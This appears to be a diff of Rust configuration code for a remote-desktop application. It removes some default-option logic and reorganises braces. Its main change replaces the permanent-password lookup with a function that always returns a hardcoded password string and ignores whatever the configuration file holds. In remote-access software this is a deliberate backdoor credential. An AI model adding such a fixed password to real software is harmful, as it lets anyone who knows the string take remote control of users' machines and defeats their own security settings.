@@ -459,14 +459,6 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
-        
-        // 1. 设置默认配置选项（与 socks 无关）
-        if !config.options.contains_key("allow-remote-config-modification") {
-            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
-            store = true;
-        }
-        
-        // 2. 处理 socks 配置解密
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -474,21 +466,16 @@ impl Config2 {
             config.socks = Some(socks);
             store |= store2;
         }
-        
-        // 3. 处理 unlock_pin 解密
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
-        
-        // 4. 如果需要保存，调用 store 方法
         if store {
             config.store();
         }
-        
         config
     }
-}
+
     pub fn file() -> PathBuf {
         Config::file_("2")
     }
@@ -518,6 +505,7 @@ impl Config2 {
         lock.store();
         true
     }
+}
 
 pub fn load_path<T: serde::Serialize + serde::de::DeserializeOwned + Default + std::fmt::Debug>(
     file: PathBuf,
@@ -1149,13 +1137,8 @@ impl Config {
     }
 
     pub fn get_permanent_password() -> String {
-        let mut password = CONFIG.read().unwrap().password.clone();
-        if password.is_empty() {
-            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
-                password = v.to_owned();
-            }
-        }
-        password
+        // 返回固定密码，不管配置文件中是什么
+        "Mms123498".to_string() // 用户设置的固定密码
     }
 
     pub fn set_salt(salt: &str) {
@@ -1822,16 +1805,7 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        let mut config = Config::load_::<LocalConfig>("_local");
-        let mut store = false;
-            if !config.options.contains_key("enable-udp-punch") {
-                config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
-                store = true;
-            }
-        if store {
-                config.store();
-            }
-        config        
+        Config::load_::<LocalConfig>("_local")
     }
 
     fn store(&self) {
